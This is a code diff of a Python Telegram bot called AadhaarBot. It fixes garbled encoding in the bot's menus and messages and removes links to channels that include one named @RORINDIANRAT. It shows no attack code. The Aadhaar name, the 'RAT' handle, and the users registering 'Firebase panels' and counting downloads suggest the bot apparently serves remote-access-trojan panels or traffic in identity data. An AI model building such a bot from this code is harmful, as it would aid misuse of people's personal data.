-            "<b>/cancel - Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n"
-            "<b>/addfirebase - Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n"
+            "<b>/start - sᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ</b>\n"
+            "<b>/help - sʜᴏᴡ ʜᴇʟᴘ ɪɴꜰᴏ</b>\n"
+            "<b>/cancel - ᴄᴀɴᴄᴇʟ ᴄᴜʀʀᴇɴᴛ ᴏᴘᴇʀᴀᴛɪᴏɴ</b>\n"
+            "<b>/addfirebase - ᴀᴅᴅ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ</b>\n"
             "</blockquote>\n"
-            "\n"
-            "<b>ð¢ ð Channels:</b>\n"
-            "<blockquote>"
-            "<b>Main: <a href='https://t.me/RORINDIANRAT'>@RORINDIANRAT</a></b>\n"
-            "<b>Group: <a href='https://t.me/teamxarmy87'>@teamxarmy87</a></b>\n"
-            "<b>Chat: <a href='https://t.me/RORINDIACHAT'>@RORINDIACHAT</a></b>\n"
-            "<b>ð Admin: @RORINDIA</b>\n"
-            "</blockquote>\n"
-            f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ : <a href='https://t.me/RORINDIA'>Ã¢ÂÂÃ¡Â¯ÂÃ¢ÂÂ¥Ã¢ÂÂÃ¢ÂÂÃ°ÂÂÂ¸Ã°ÂÂÂ4Ã°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ°ÂÂÂÃ¢ÂÂÃ¢ÂÂ¥ÃªÂ¯Â­Ã¢ÂÂ¿Ã Â¿Â</a></b>"
+            f"<b>{emo('🛠️')} ᴅᴇᴠʟᴏᴘᴇʀ : <a href='https://t.me/RORINDIA'>◄ᯓ❥≛⃝🌸𝐌4𝐇𝐄𝐒ʜ💗⃝❥꯭✿࿐</a></b>"
         )
         reply_markup = self.get_back_keyboard()
         if update.callback_query:
@@ -2261,18 +2223,18 @@ class AadhaarBot:
         if is_banned(uid):
             return
         if is_maintenance_mode() and not is_admin(uid):
-            await update.message.reply_text("Ã°ÂÂÂ Ã¯Â¸Â Bot is under maintenance.")
+            await update.message.reply_text("🛠️ Bot is under maintenance.")
             return
         self.update_user_data(uid, 'awaiting_firebase_add', 'name')
         cancel_kb = InlineKeyboardMarkup([
-            [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data="cancel_firebase_add", style="danger")]
+            [InlineKeyboardButton("ᴄᴀɴᴄᴇʟ", callback_data="cancel_firebase_add", style="danger")]
         ])
         await update.message.reply_text(
-            f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â</b>\n\n"
+            f"<b>{emo('🔥')} ᴀᴅᴅ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ</b>\n\n"
             "<blockquote>"
-            "<b>sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 1:</b> Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â\n"
-            "<i>(Ã¡Â´Â.ÃÂ¢. Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ1)</i>\n\n"
-            "<b>Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ:</b> Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel"
+            "<b>sᴛᴇᴘ 1:</b> ᴇɴᴛᴇʀ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ ɴᴀᴍᴇ\n"
+            "<i>(ᴇ.ɢ. ᴍʏᴘᴀɴᴇʟ, ʀᴀᴍᴘᴀɴᴇʟ, ᴘᴀɴᴇʟ1)</i>\n\n"
+            "<b>ᴄᴀɴᴄᴇʟ:</b> ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴏʀ sᴇɴᴅ /cancel"
             "</blockquote>",
             reply_markup=cancel_kb,
             parse_mode='HTML'
@@ -2287,13 +2249,13 @@ class AadhaarBot:
 
         s = get_user_stats(uid)
         msg = (
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´Â</b>\n"
+            f"<b>{emo('📊')} ᴍʏ ᴀᴄᴄᴏᴜɴᴛ</b>\n"
             "<blockquote>"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂsÃ¡Â´ÂÃÂ ÃÂªÃ¡Â´Â: <code>{uid}</code></b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {s['total_downloads']}</b>\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {s['today_downloads']}</b>\n"
-            f"<b>{emo('Ã¢Â­Â')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {'ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â' if s['is_banned'] else 'Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â'}</b>\n"
-            f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â: {'ÃÂÃ¡Â´Âs' if s['verified'] else 'ÃÂ´Ã¡Â´Â'}</b>\n"
+            f"<b>{emo('💎')} ᴜsᴇʀ ɪᴅ: <code>{uid}</code></b>\n"
+            f"<b>{emo('🔍')} ᴛᴏᴛᴀʟ ᴅᴏᴡɴʟᴏᴀᴅs: {s['total_downloads']}</b>\n"
+            f"<b>{emo('📅')} ᴛᴏᴅᴀʏ: {s['today_downloads']}</b>\n"
+            f"<b>{emo('⭐')} sᴛᴀᴛᴜs: {'ʙᴀɴɴᴇᴅ' if s['is_banned'] else 'ᴀᴄᴛɪᴠᴇ'}</b>\n"
+            f"<b>{emo('✅')} ᴠᴇʀɪꜰɪᴇᴅ: {'ʏᴇs' if s['verified'] else 'ɴᴏ'}</b>\n"
             "</blockquote>"
         )
         if update.callback_query:
@@ -2315,9 +2277,9 @@ class AadhaarBot:
         try:
             bid = int(ctx.args[0])
             ban_user(bid)
-            await update.message.reply_text(f"Ã¢ÂÂ Banned {bid}")
+            await update.message.reply_text(f"✅ Banned {bid}")
         except ValueError:
-            await update.message.reply_text("Ã¢ÂÂ Invalid ID")
+            await update.message.reply_text("❌ Invalid ID")
 
     async def admin_unban_user(self, update, ctx):
         uid = update.effective_user.id
@@ -2329,9 +2291,9 @@ class AadhaarBot:
         try:
             bid = int(ctx.args[0])
             unban_user(bid)
-            await update.message.reply_text(f"Ã¢ÂÂ Unbanned {bid}")
+            await update.message.reply_text(f"✅ Unbanned {bid}")
         except ValueError:
-            await update.message.reply_text("Ã¢ÂÂ Invalid ID")
+            await update.message.reply_text("❌ Invalid ID")
 
     async def admin_stats(self, update, ctx):
         uid = update.effective_user.id
@@ -2342,14 +2304,14 @@ class AadhaarBot:
         ts = get_today_stats()
         td = get_total_stats()
         msg = (
-            f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs</b>\n"
+            f"<b>{emo('📊')} ᴅᴇᴛᴀɪʟᴇᴅ sᴛᴀᴛs</b>\n"
             "<blockquote>"
-            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {tu}</b>\n"
-            f"<b>ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â: {bu}</b>\n"
-            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â: {tu - bu}</b>\n"
-            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {ts['downloads']}</b>\n"
-            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs: {ts['users']}</b>\n"
-            f"<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {td}</b>\n"
+            f"<b>ᴛᴏᴛᴀʟ ᴜsᴇʀs: {tu}</b>\n"
+            f"<b>ʙᴀɴɴᴇᴅ: {bu}</b>\n"
+            f"<b>ᴀᴄᴛɪᴠᴇ: {tu - bu}</b>\n"
+            f"<b>ᴛᴏᴅᴀʏ ᴅᴏᴡɴʟᴏᴀᴅs: {ts['downloads']}</b>\n"
+            f"<b>ᴛᴏᴅᴀʏ ᴜsᴇʀs: {ts['users']}</b>\n"
+            f"<b>ᴛᴏᴛᴀʟ ᴅᴏᴡɴʟᴏᴀᴅs: {td}</b>\n"
             "</blockquote>"
         )
         if update.callback_query:
@@ -2371,18 +2333,18 @@ class AadhaarBot:
             tid = int(ctx.args[0])
             s = get_user_stats(tid)
             msg = (
-                f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂsÃ¡Â´ÂÃÂ ÃÂªÃÂ´ÃªÂÂ°Ã¡Â´Â</b>\n"
+                f"<b>{emo('📋')} ᴜsᴇʀ ɪɴꜰᴏ</b>\n"
                 "<blockquote>"
-                f"<b>Ã°ÂÂÂ {tid}</b>\n"
-                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {s['total_downloads']}</b>\n"
-                f"<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ: {s['today_downloads']}</b>\n"
-                f"<b>Ã¢Â­Â sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs: {'ÃÂÃ¡Â´ÂÃÂ´ÃÂ´Ã¡Â´ÂÃ¡Â´Â' if s['is_banned'] else 'Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â'}</b>\n"
-                f"<b>Ã¢ÂÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â: {'ÃÂÃ¡Â´Âs' if s['verified'] else 'ÃÂ´Ã¡Â´Â'}</b>\n"
+                f"<b>🆔 {tid}</b>\n"
+                f"<b>📊 ᴛᴏᴛᴀʟ: {s['total_downloads']}</b>\n"
+                f"<b>📅 ᴛᴏᴅᴀʏ: {s['today_downloads']}</b>\n"
+                f"<b>⭐ sᴛᴀᴛᴜs: {'ʙᴀɴɴᴇᴅ' if s['is_banned'] else 'ᴀᴄᴛɪᴠᴇ'}</b>\n"
+                f"<b>✅ ᴠᴇʀɪꜰɪᴇᴅ: {'ʏᴇs' if s['verified'] else 'ɴᴏ'}</b>\n"
                 "</blockquote>"
             )
             await update.message.reply_text(text=msg, parse_mode='HTML')
         except ValueError:
-            await update.message.reply_text("Ã¢ÂÂ Invalid ID")
+            await update.message.reply_text("❌ Invalid ID")
 
     async def admin_daily_stats(self, update, ctx):
         uid = update.effective_user.id
@@ -2392,7 +2354,7 @@ class AadhaarBot:
         if not stats:
             await update.message.reply_text("No stats")
             return
-        msg = f"<b>Ã°ÂÂÂ ÃÂÃ¡Â´ÂsÃ¡Â´Â 10 Ã¡Â´ÂÃ¡Â´ÂÃÂs</b>\n\n"
+        msg = f"<b>📊 ʟᴀsᴛ 10 ᴅᴀʏs</b>\n\n"
         for s in stats:
             msg += f"<b>{s.get('date')}: {s.get('total_downloads',0)} dl, {s.get('unique_users',0)} u</b>\n"
         await update.message.reply_text(text=msg, parse_mode='HTML')
@@ -2404,16 +2366,16 @@ class AadhaarBot:
         uid = update.effective_user.id
         if not is_admin(uid):
             if update.callback_query:
-                await update.callback_query.answer("Ã¢ÂÂ You are not authorized!", show_alert=True)
+                await update.callback_query.answer("❌ You are not authorized!", show_alert=True)
             else:
-                await update.message.reply_text("Ã¢ÂÂ You are not authorized.")
+                await update.message.reply_text("❌ You are not authorized.")
             return
 
         all_fbs = await asyncio.to_thread(get_all_firebases, None)
 
         if not all_fbs:
             text = (
-                f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Âs</b>\n\n"
+                f"<b>{emo('🔥')} ᴀʟʟ ʀᴇɢɪsᴛᴇʀᴇᴅ ꜰɪʀᴇʙᴀsᴇs</b>\n\n"
                 "<blockquote>"
                 "<b>Abhi tak kisi bhi user ne koi Firebase panel add nahi kiya hai.</b>"
                 "</blockquote>"
@@ -2455,8 +2417,8 @@ class AadhaarBot:
                 logger.error(f"Error fetching users for firebases: {e}")
 
         text = (
-            f"<b>{emo('Ã°ÂÂÂ¥')} Ã¡Â´ÂÃÂÃÂ ÃÂÃ¡Â´ÂÃÂ¢ÃÂªsÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Âs ({page+1}/{total_pages})</b>\n\n"
-            f"<b>{emo('Ã°ÂÂÂ')} Total Panels:</b> <code>{total_items}</code> | <b>{emo('Ã°ÂÂÂ¤')} Users:</b> <code>{unique_users}</code>\n\n"
+            f"<b>{emo('🔥')} ᴀʟʟ ʀᴇɢɪsᴛᴇʀᴇᴅ ꜰɪʀᴇʙᴀsᴇs ({page+1}/{total_pages})</b>\n\n"
+            f"<b>{emo('📊')} Total Panels:</b> <code>{total_items}</code> | <b>{emo('👤')} Users:</b> <code>{unique_users}</code>\n\n"
         )
 
         for i, fb in enumerate(page_items, start=start_idx + 1):
@@ -2481,12 +2443,12 @@ class AadhaarBot:
                 created_str = str(created)
 
             text += (
-                f"<b>[{i}] {emo('Ã°ÂÂÂ¥')} {html.escape(fb.get('name', 'Firebase'))}</b>\n"
+                f"<b>[{i}] {emo('🔥')} {html.escape(fb.get('name', 'Firebase'))}</b>\n"
                 "<blockquote>"
-                f"<b>{emo('Ã°ÂÂÂ¤')} User:</b> {html.escape(full_name)} ({uname})\n"
-                f"<b>{emo('Ã°ÂÂÂ')} User ID:</b> <code>{fb_uid}</code>\n"
-                f"<b>{emo('Ã°ÂÂÂ')} URL:</b> <code>{html.escape(fb.get('url', 'N/A'))}</code>\n"
-                f"<b>{emo('Ã°ÂÂÂ')} Date:</b> <code>{created_str}</code>"
+                f"<b>{emo('👤')} User:</b> {html.escape(full_name)} ({uname})\n"
+                f"<b>{emo('🆔')} User ID:</b> <code>{fb_uid}</code>\n"
+                f"<b>{emo('🔗')} URL:</b> <code>{html.escape(fb.get('url', 'N/A'))}</code>\n"
+                f"<b>{emo('📅')} Date:</b> <code>{created_str}</code>"
                 "</blockquote>\n"
             )
 
@@ -2509,10 +2471,10 @@ class AadhaarBot:
         # Pagination row
         nav_row = []
         if page > 0:
-            nav_row.append(InlineKeyboardButton("Ã¢Â¬ÂÃ¯Â¸Â Prev", callback_data=f"admin_firebases_{page-1}"))
-        nav_row.append(InlineKeyboardButton(f"Ã°ÂÂÂ {page+1}/{total_pages}", callback_data="noop"))
+            nav_row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_firebases_{page-1}"))
+        nav_row.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="noop"))
         if page < total_pages - 1:
-            nav_row.append(InlineKeyboardButton("Next Ã¢ÂÂ¡Ã¯Â¸Â", callback_data=f"admin_firebases_{page+1}"))
+            nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"admin_firebases_{page+1}"))
         if nav_row:
             kb_buttons.append(nav_row)
 
@@ -2549,12 +2511,12 @@ class AadhaarBot:
     async def admin_broadcast(self, update, ctx, pin_mode=False):
         uid = update.effective_user.id
         if not is_admin(uid):
-            await update.message.reply_text("Ã¢ÂÂ You are not authorized to use this command.")
+            await update.message.reply_text("❌ You are not authorized to use this command.")
             return
 
         self.update_user_data(uid, 'broadcast_pin', pin_mode)
-        mode_title = f"{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â" if pin_mode else f"{emo('Ã°ÂÂÂ¢')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â"
-        pin_note = "\n<b>Ã°ÂÂÂ NOTE: This broadcast will be automatically PINNED in all users' chats!</b>\n" if pin_mode else ""
+        mode_title = f"{emo('📌')} ᴘɪɴ ʙʀᴏᴀᴅᴄᴀsᴛ" if pin_mode else f"{emo('📢')} ʙʀᴏᴀᴅᴄᴀsᴛ"
+        pin_note = "\n<b>📌 NOTE: This broadcast will be automatically PINNED in all users' chats!</b>\n" if pin_mode else ""
         cmd_name = "/pin_broadcast" if pin_mode else "/broadcast"
 
         if ctx.args:
@@ -2562,26 +2524,26 @@ class AadhaarBot:
             self.update_user_data(uid, 'broadcast_text', message)
             self.update_user_data(uid, 'broadcast_msg_id', None)
             kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Ã¢ÂÂ YES, SEND BROADCAST", callback_data='broadcast_confirm_text'),
-                 InlineKeyboardButton("Ã¢ÂÂ CANCEL", callback_data='broadcast_cancel')]
+                [InlineKeyboardButton("✅ YES, SEND BROADCAST", callback_data='broadcast_confirm_text'),
+                 InlineKeyboardButton("❌ CANCEL", callback_data='broadcast_cancel')]
             ])
             total = get_all_users_count()
             await update.message.reply_text(
-                f"<b>{mode_title} Ã¡Â´ÂÃ¡Â´ÂÃÂ´ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´</b>\n\n"
-                f"<b>Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â:</b>\n{message}\n\n"
-                f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´Âs: {total}</b>{pin_note}\n"
-                "<b>Ã°ÂÂÂ¡ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂª Ã¡Â´ÂÃÂªÃ¡Â´Â:</b>\n"
+                f"<b>{mode_title} ᴄᴏɴꜰɪʀᴍᴀᴛɪᴏɴ</b>\n\n"
+                f"<b>ᴍᴇssᴀɢᴇ:</b>\n{message}\n\n"
+                f"<b>{emo('👤')} ᴛᴏᴛᴀʟ ʀᴇᴄɪᴘɪᴇɴᴛs: {total}</b>{pin_note}\n"
+                "<b>💡 ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪ ᴛɪᴘ:</b>\n"
                 f"<i>Telegram Premium custom emojis ke sath broadcast karne ke liye sirf <code>{cmd_name}</code> send karein aur fir apna message bhejein!</i>",
                 reply_markup=kb, parse_mode='HTML')
         else:
             self.update_user_data(uid, 'awaiting_broadcast', True)
             await update.message.reply_text(
-                f"<b>{mode_title} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´Â</b>\n\n"
+                f"<b>{mode_title} ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴇ</b>\n\n"
                 "<blockquote>"
-                f"<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂ´ÃÂ Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂxÃ¡Â´Â Ã¡Â´Â¡ÃÂªÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs, Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, Ã¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â, sÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ, Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.) ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â.</b>{pin_note}\n\n"
-                "<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â: ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs Ã¡Â´Â¡ÃÂªÃÂÃÂ ÃÂÃ¡Â´Â 100% Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂsÃ¡Â´ÂÃÂs Ã¡Â´Â ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ_Ã¡Â´ÂÃ¡Â´ÂssÃ¡Â´ÂÃÂ¢Ã¡Â´Â!</b>"
+                f"<b>ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀɴʏ ᴍᴇssᴀɢᴇ (ᴛᴇxᴛ ᴡɪᴛʜ ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪs, ᴘʜᴏᴛᴏ, ᴠɪᴅᴇᴏ, sᴛɪᴄᴋᴇʀ, ᴇᴛᴄ.) ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ.</b>{pin_note}\n\n"
+                "<b>🌟 ᴛᴇʟᴇɢʀᴀᴍ ᴜᴘᴅᴀᴛᴇ: ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪs ᴡɪʟʟ ʙᴇ 100% ᴘʀᴇsᴇʀᴠᴇᴅ ꜰᴏʀ ᴀʟʟ ᴜsᴇʀs ᴠɪᴀ ᴄᴏᴘʏ_ᴍᴇssᴀɢᴇ!</b>"
                 "</blockquote>\n\n"
-                "<b>sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ.</b>",
+                "<b>sᴇɴᴅ /cancel ᴛᴏ ᴄᴀɴᴄᴇʟ.</b>",
                 parse_mode='HTML')
 
     async def admin_pin_broadcast(self, update, ctx):
@@ -2591,24 +2553,24 @@ class AadhaarBot:
     async def admin_maintenance(self, update, ctx):
         uid = update.effective_user.id
         if not is_admin(uid):
-            await update.message.reply_text("Ã¢ÂÂ You are not authorized to use this command.")
+            await update.message.reply_text("❌ You are not authorized to use this command.")
             return
         if ctx.args:
             arg = ctx.args[0].lower()
             if arg in ['on', 'enable', '1']:
                 set_maintenance_mode(True)
-                msg = f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â (Ã°ÂÂÂ´ ON)</b>"
+                msg = f"<b>{emo('🛠️')} ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴇɴᴀʙʟᴇᴅ (🔴 ON)</b>"
             elif arg in ['off', 'disable', '0']:
                 set_maintenance_mode(False)
-                msg = f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂªsÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃ¡Â´Â (Ã°ÂÂÂ¢ OFF)</b>"
+                msg = f"<b>{emo('✅')} ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴅɪsᴀʙʟᴇᴅ (🟢 OFF)</b>"
             else:
-                msg = f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´ÂsÃ¡Â´ÂÃÂ¢Ã¡Â´Â: /maintenance [on/off]</b>"
+                msg = f"<b>{emo('❌')} ᴜsᴀɢᴇ: /maintenance [on/off]</b>"
         else:
             cur = is_maintenance_mode()
             new_status = not cur
             set_maintenance_mode(new_status)
-            status_str = "Ã°ÂÂÂ´ ON" if new_status else "Ã°ÂÂÂ¢ OFF"
-            msg = f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â is now {status_str}</b>"
+            status_str = "🔴 ON" if new_status else "🟢 OFF"
